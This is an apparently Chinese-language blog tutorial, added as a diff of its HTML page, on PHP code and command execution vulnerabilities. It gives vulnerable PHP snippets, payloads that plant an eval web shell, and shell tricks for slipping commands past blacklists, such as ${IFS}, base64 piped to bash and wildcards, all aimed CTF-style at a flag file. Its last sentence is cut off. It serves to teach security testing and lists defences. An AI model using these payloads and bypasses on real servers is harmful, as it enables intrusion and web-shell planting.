@@ -1,0 +1,772 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://images.atsud0.me/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://images.atsud0.me/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://images.atsud0.me/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="https://images.atsud0.me/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"atsud0.me","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="remote command&#x2F;code execute远程命令&#x2F;代码执行简称RCE。远程代码执行，不仅会出现在php也会出现在java,python等编程语言中。 远程代码执行漏洞的产生原因  对用户输入过滤不严,用户可以通过请求将代码注入到应用中由服务器执行">
+<meta property="og:type" content="article">
+<meta property="og:title" content="代码-命令执行漏洞">
+<meta property="og:url" content="http://atsud0.me/2020/05/30/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
+<meta property="og:site_name" content="雪之下二丁目鹤岗八幡宫">
+<meta property="og:description" content="remote command&#x2F;code execute远程命令&#x2F;代码执行简称RCE。远程代码执行，不仅会出现在php也会出现在java,python等编程语言中。 远程代码执行漏洞的产生原因  对用户输入过滤不严,用户可以通过请求将代码注入到应用中由服务器执行">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200805_111026.jpg">
+<meta property="article:published_time" content="2020-05-30T06:16:46.000Z">
+<meta property="article:modified_time" content="2021-02-23T15:38:50.457Z">
+<meta property="article:author" content="atsud0">
+<meta property="article:tag" content="Windows">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="命令执行">
+<meta property="article:tag" content="代码执行">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://images.atsud0.me/images/post/Screenshot_20200805_111026.jpg">
+
+<link rel="canonical" href="http://atsud0.me/2020/05/30/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>代码-命令执行漏洞 | 雪之下二丁目鹤岗八幡宫</title>
+  
+    <script>
+      function sendPageView() {
+        if (CONFIG.hostname !== location.hostname) return;
+        var uid = localStorage.getItem('uid') || (Math.random() + '.' + Math.random());
+        localStorage.setItem('uid', uid);
+        navigator.sendBeacon('https://www.google-analytics.com/collect', new URLSearchParams({
+          v  : 1,
+          tid: 'UA-163969429-1',
+          cid: uid,
+          t  : 'pageview',
+          dp : encodeURIComponent(location.pathname)
+        }));
+      }
+      document.addEventListener('pjax:complete', sendPageView);
+      sendPageView();
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">雪之下二丁目鹤岗八幡宫</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/index.html" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">166</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">10</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">128</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://atsud0.me/2020/05/30/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://images.atsud0.me/images/atsud0-avator.jpg">
+      <meta itemprop="name" content="atsud0">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="雪之下二丁目鹤岗八幡宫">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          代码-命令执行漏洞
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-05-30 14:16:46" itemprop="dateCreated datePublished" datetime="2020-05-30T14:16:46+08:00">2020-05-30</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-02-23 23:38:50" itemprop="dateModified" datetime="2021-02-23T23:38:50+08:00">2021-02-23</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Note/" itemprop="url" rel="index"><span itemprop="name">Note</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>4.8k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>4 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><code>remote command/code execute</code>远程命令/代码执行简称RCE。远程代码执行，不仅会出现在php也会出现在java,python等编程语言中。</p>
+<p>远程代码执行漏洞的产生原因</p>
+<ul>
+<li>对用户输入过滤不严,用户可以通过请求将代码注入到应用中由服务器执行<a id="more"></a>
+
+</li>
+</ul>
+<h2 id="php代码执行漏洞相关函数"><a href="#php代码执行漏洞相关函数" class="headerlink" title="php代码执行漏洞相关函数"></a>php代码执行漏洞相关函数</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><p>eval()将字符串当作php代码执行.必须以分号结尾.(但是eval不是函数)</p>
+<blockquote><p>Note: 因为是一个语言构造器而不是一个函数，不能被 可变函数 调用。 </p>
+<footer><strong>eval</strong><cite><a href="https://www.php.net/manual/zh/function.eval.php" target="_blank" rel="noopener">eval函数php中文手册</a></cite></footer></blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$code=$_GET[<span class="string">'code'</span>];</span><br><span class="line"><span class="keyword">eval</span>($code);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><figcaption><span>eval_payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;eval($_POST[a]);</span><br></pre></td></tr></table></figure>
+
+<h3 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h3><p>assert()会将字符串当作php代码执行,不需要以分号结尾.但是<code>assert</code>在php7中变成了一种语言结构,和eval函数一样,不支持可变函数调用.</p>
+<blockquote><p>assert() is a language construct in PHP 7, allowing for the definition of expectations: assertions that take effect in development and testing environments, but are optimised away to have zero cost in production. </p>
+<footer><strong>assert</strong><cite><a href="https://www.php.net/manual/zh/function.assert" target="_blank" rel="noopener">assert函数php中文手册</a></cite></footer></blockquote>
+
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$code=$_GET[<span class="string">'code'</span>];</span><br><span class="line">assert($code);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><figcaption><span>assert_payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;fwrite(fopen(&#39;shell.php&#39;,&#39;a+&#39;),&#39;&lt;?php eval($_POST[a])?&gt;&#39;)</span><br></pre></td></tr></table></figure>
+
+<h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace($pattern,$replacement.$subject)</span><br></pre></td></tr></table></figure>
+
+<p>当第一个参数使用e修饰符,第二个参数的值会被当成php代码执行<br>如</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$code=$_GET[<span class="string">'code'</span>];</span><br><span class="line">$str=preg_replace(<span class="string">"/\[(.*)\]/e"</span>,<span class="string">'\\1'</span>, $code);</span><br><span class="line">$print($str);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><figcaption><span>preg_replace_payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;[eval($_POST[a])]</span><br></pre></td></tr></table></figure>
+
+<h3 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func"></a>call_user_func</h3><p>call_user_func()函数<br><code>call_user_func($callback,$parameter)</code><br>$callback是一个被调用的函数,其余参数是被调用函数的参数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$function=$_GET[<span class="string">'fun'</span>];</span><br><span class="line">$parameter=$_GET[<span class="string">'para'</span>];</span><br><span class="line">call_user_func($function,$parameter);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><figcaption><span>call_user_func_payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?fun&#x3D;assert&amp;para&#x3D;fwrite(fopen(&#39;shell.php&#39;,&#39;a+&#39;),&#39;&lt;?php eval($_POST[a])?&gt;&#39;)</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="a-b-动态函数"><a href="#a-b-动态函数" class="headerlink" title="$a($b)动态函数"></a>$a($b)动态函数</h3><p>动态函数<code>$a($b)</code>和<code>call_user_func()</code>利用方法一样.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=$_GET[<span class="string">'b'</span>];</span><br><span class="line">a($b);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><figcaption><span>call_user_func_payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;assert&amp;b&#x3D;fwrite(fopen(&#39;shell.php&#39;,&#39;a+&#39;),&#39;&lt;?php eval($_POST[a])?&gt;&#39;)</span><br></pre></td></tr></table></figure>
+
+
+<p>防御方式:</p>
+<ul>
+<li>不使用eval等函数</li>
+<li>过滤</li>
+<li>更新php版本</li>
+<li>在php配置文件中禁用危险函数 <code>disable_function</code>=phpinfo…等函数,但是eval无法禁用,因为eval不是函数</li>
+<li>preg_replace弃用/e修饰符</li>
+</ul>
+<p>代码执行漏洞利用</p>
+<ol>
+<li>get_webshell</li>
+<li>print <code>__FILE__</code> //获取当前文件的绝对路径</li>
+<li>print file_get_contents(‘C:\Windows\System32\drivers\etc\hosts’)读文件(能否读文件,具体还是得看web用户的权限)</li>
+<li>file_put_contents(‘文件名’,’内容’)写文件</li>
+</ol>
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>造成原因:</p>
+<ul>
+<li>过滤不严</li>
+<li>系统漏洞造成命令注入</li>
+<li>调用的第三方组建存在代码执行漏洞</li>
+</ul>
+<p>危害:</p>
+<ul>
+<li>继承web用户权限</li>
+<li>读写文件</li>
+<li>反弹shell</li>
+<li>控制网站/服务器</li>
+</ul>
+<h3 id="命令执行漏洞相关函数"><a href="#命令执行漏洞相关函数" class="headerlink" title="命令执行漏洞相关函数"></a>命令执行漏洞相关函数</h3><h4 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h4><p>不会输出结果,而是返回结果的最后一行.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line"><span class="keyword">echo</span> exec($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h4 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h4><p>成功输出结果并返回结果的最后一行,失败返回<code>False</code>.</p>
+<h4 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h4><p>函数实际上是反引号的实体(`),不输出结果,返回执行结果.</p>
+<h4 id="反引号"><a href="#反引号" class="headerlink" title="反引号``"></a>反引号``</h4><p>和<code>shell_exec</code>一样,不输出结果,返回执行结果.</p>
+<h4 id="passthru"><a href="#passthru" class="headerlink" title="passthru"></a>passthru</h4><p>直接将结果输出到浏览器,不返回任何值,而且可以输出二进制结果.</p>
+<h4 id="popen-command-mode"><a href="#popen-command-mode" class="headerlink" title="popen(command,mode)"></a>popen(command,mode)</h4><p>使用command打开进程文件指针,将字符串作为系统命令执行,但是函数既不输出结果也不返回命名结果,而是返回一个文件命令指针.</p>
+<p>command-需要执行的命令<br>mode(r/x) 规定连接模式,r只读,x只写</p>
+<figure class="highlight plain"><figcaption><span>popen_payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;echo ^&lt;?php phpinfo()?^&gt; &gt; shell.php </span><br></pre></td></tr></table></figure>
+<p>windows<code>cmd</code>里面的转义符号是<code>^</code>号</p>
+<h4 id="命令连接符"><a href="#命令连接符" class="headerlink" title="命令连接符"></a>命令连接符</h4><table>
+<thead>
+<tr>
+<th>符号</th>
+<th>系统支持</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>|</td>
+<td>Windows&amp;Linux</td>
+<td>管道符</td>
+</tr>
+<tr>
+<td>||</td>
+<td>Windows&amp;Linux</td>
+<td></td>
+</tr>
+<tr>
+<td>&amp;</td>
+<td>Windows&amp;Linux</td>
+<td>不管右边的命令是否执行成功,都会执行左边的命令</td>
+</tr>
+<tr>
+<td>&amp;&amp;</td>
+<td>Windows&amp;Linux</td>
+<td>只有右边的命令执行成功后,才会执行左边的命令</td>
+</tr>
+<tr>
+<td>;</td>
+<td>Linux</td>
+<td>执行完左边的命令后,执行右边的命令</td>
+</tr>
+</tbody></table>
+<p>防御</p>
+<ul>
+<li>减少命令执行函数的使用,并警用</li>
+<li>对参数进行过滤</li>
+<li>参数引号包裹</li>
+<li>更新php版本</li>
+</ul>
+<h2 id="命令和代码执行的本质"><a href="#命令和代码执行的本质" class="headerlink" title="命令和代码执行的本质"></a>命令和代码执行的本质</h2><p>用了相关的函数，却存在可以被用户动态控制的变量。能被用户动态控制的变量，却不严格过滤用户的输入。</p>
+<p>两者的区别:</p>
+<ul>
+<li>代码执行，执行代码执行的语句</li>
+<li>命令执行，直接执行操作系统命令</li>
+<li>命令执行，特殊的代码执行,只是执行的语句是具有执行命令能力的函数</li>
+</ul>
+<h2 id="一些绕过方法"><a href="#一些绕过方法" class="headerlink" title="一些绕过方法"></a>一些绕过方法</h2><h3 id="Linux的命令执行中当空格被过滤"><a href="#Linux的命令执行中当空格被过滤" class="headerlink" title="Linux的命令执行中当空格被过滤"></a>Linux的命令执行中当空格被过滤</h3><h4 id="IFS-代替空格-bash"><a href="#IFS-代替空格-bash" class="headerlink" title="${IFS}代替空格(bash)"></a>${IFS}代替空格(bash)</h4><p>类似于这个靶机的情况:<a href="/2020/06/14/Vulnhub-Dmv/" title="Vulnhub-Dmv-1">Vulnhub-Dmv-1</a></p>
+<p>使用${IFS}代替空格。</p>
+<ul>
+<li><a href="https://www.cnblogs.com/cocowool/archive/2013/01/15/2861904.html" title="" target="">shell:处理文件中的空格</a>
+
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat$&#123;IFS&#125;1.php</span><br></pre></td></tr></table></figure>
+
+<h4 id="lt-gt-重定向符代替"><a href="#lt-gt-重定向符代替" class="headerlink" title="&lt;&gt;重定向符代替"></a>&lt;&gt;重定向符代替</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat&lt;&gt;1.php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat&lt;1.php</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="突破黑名单绕过"><a href="#突破黑名单绕过" class="headerlink" title="(突破黑名单绕过)"></a>(突破黑名单绕过)</h3><h4 id="拼接"><a href="#拼接" class="headerlink" title="拼接"></a>拼接</h4><p>假设目标禁止读取flag.php，则可以尝试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;flag</span><br><span class="line">b&#x3D;.php</span><br><span class="line">c&#x3D;mo</span><br><span class="line">d&#x3D;re</span><br><span class="line"></span><br><span class="line">$c$d $a$b</span><br></pre></td></tr></table></figure>
+
+<h4 id="base64-编码"><a href="#base64-编码" class="headerlink" title="base64 编码"></a>base64 编码</h4><p>将解码后的参数传递给bash</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;cat flag.php&#39;|base64</span><br><span class="line">Y2F0IGZsYWcucGhwCg&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">echo &#39;Y2F0IGZsYWcucGhwCg&#x3D;&#x3D;&#39;|base64 -d|bash</span><br><span class="line">!!flag</span><br></pre></td></tr></table></figure>
+
+<p>使用反引号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;echo &#39;Y2F0IGZsYWcucGhwCg&#x3D;&#x3D;&#39;|base64 -d&#96;</span><br></pre></td></tr></table></figure>
+
+<p>$()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(echo &#39;Y2F0IGZsYWcucGhwCg&#x3D;&#x3D;&#39;|base64 -d)</span><br></pre></td></tr></table></figure>
+
+<h4 id="使用单引号-双引号-反斜杠"><a href="#使用单引号-双引号-反斜杠" class="headerlink" title="使用单引号,双引号,反斜杠"></a>使用单引号,双引号,反斜杠</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c&#39;a&#39;t flag.php </span><br><span class="line">!!flag</span><br><span class="line"></span><br><span class="line">c&#39;a&#39;t fl&quot;a&quot;g.php</span><br><span class="line">!!flag</span><br><span class="line"></span><br><span class="line">ca\t flag.\php</span><br><span class="line">!!flag</span><br></pre></td></tr></table></figure>
+
+<p>因为可以这样输出命令，所以可以将命令写入到一个文件中去，再去执行要执行的命令。如果限制长度的话，则可以一次只写一点，再写进去执行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">echo \c\a\t\ f\l\a\g.php</span><br><span class="line">cat flag.php</span><br><span class="line"></span><br><span class="line">echo \c\a\t\ f\l\a\g.php &gt;4</span><br><span class="line"></span><br><span class="line">cat 4</span><br><span class="line">cat flag.php</span><br><span class="line"></span><br><span class="line">bash 4</span><br><span class="line">!!flag</span><br></pre></td></tr></table></figure>
+
+<p>要注意的是引号要成对出现。并且单引号，双引号也能和``$()来配合使用</p>
+<h4 id="使用一个内容为空的变量名"><a href="#使用一个内容为空的变量名" class="headerlink" title="使用一个内容为空的变量名"></a>使用一个内容为空的变量名</h4><p>没有赋值的变量，在bash中都是为空。比如<br><img src="https://images.atsud0.me/images/post/Screenshot_20200805_111026.jpg" alt=""></p>
+<p>所以就可以使用这样的方法来绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c$3at fl$&#123;fff&#125;ag.php</span><br></pre></td></tr></table></figure>
+
+<p>为什么$fff要用{}来包裹?因为如果不用花括号对fff这个不存在的变量包裹的话，这个语句就会出错，包裹起来是为了告诉bash，变量的名字是fff不是fffag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c$3at fl$fffag.php</span><br><span class="line">cat: fl.php: No such file or directory</span><br></pre></td></tr></table></figure>
+
+<p>特殊符号的!和@也$()有相同的效果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c$!at fl$@ag.php</span><br><span class="line">!!flag</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c$()at fl$()ag.php</span><br><span class="line">!!flag</span><br></pre></td></tr></table></figure>
+
+<p>$* 也可以占位使用。</p>
+<p>这一切都是基于这个变量名没有被使用。</p>
+<p>如果该变量被使用了的会就会变成这个样子。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ca$&#123;x&#125;t fl$&#123;v&#125;ag.php</span><br><span class="line">!!flag</span><br><span class="line">x&#x3D;1</span><br><span class="line">ca$&#123;x&#125;t fl$&#123;v&#125;ag.php</span><br><span class="line">bash: ca1t: command not found</span><br></pre></td></tr></table></figure>
+
+<h4 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;???&#x2F;?[a][t] flag.php </span><br><span class="line">!!flag</span><br></pre></td></tr></table></figure>
+
+<p>但是文件名被过滤的话，可以这样绕过.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;???&#x2F;?[a][t] ?&#39;&#39;lag.php</span><br><span class="line">!!flag</span><br><span class="line">&#x2F;???&#x2F;?[a][t] ?&#39;&#39;?&#39;&#39;ag.php</span><br><span class="line">!!flag</span><br><span class="line">&#x2F;???&#x2F;?[a][t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;g.php</span><br><span class="line">!!flag</span><br><span class="line">&#x2F;???&#x2F;?[a][t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;.php</span><br><span class="line">!!flag</span><br><span class="line">&#x2F;???&#x2F;?[a][t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;php</span><br><span class="line">!!flag</span><br><span class="line">&#x2F;???&#x2F;?[a][t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;hp</span><br><span class="line">!!flag</span><br><span class="line">&#x2F;???&#x2F;?[a][t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;p</span><br></pre></td></tr></table></figure>
+
+<p>但是如果有差不多相同(长度一样，后缀一样)的文件名的话，则会…</p>
